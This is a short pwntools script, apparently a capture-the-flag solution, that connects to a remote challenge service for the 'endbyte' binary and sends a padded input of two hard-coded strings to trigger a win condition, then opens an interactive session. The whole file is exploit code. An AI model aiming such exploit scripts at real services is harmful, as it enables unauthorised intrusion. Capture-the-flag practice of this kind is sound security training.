from pwn import *

elf=context.binary=ELF('./endbyte')

#p =process()
p =remote('20.19.88.15',7500)
off =56
win1=b'SparksInTheAir\0'
win1=win1.ljust(16,b'a')
win2=b'RamadhanKareem!!\0'
win =win1 +win2
win =win.ljust(44,b'a')


p.sendline(win)
write('pay',win)

p.interactive()
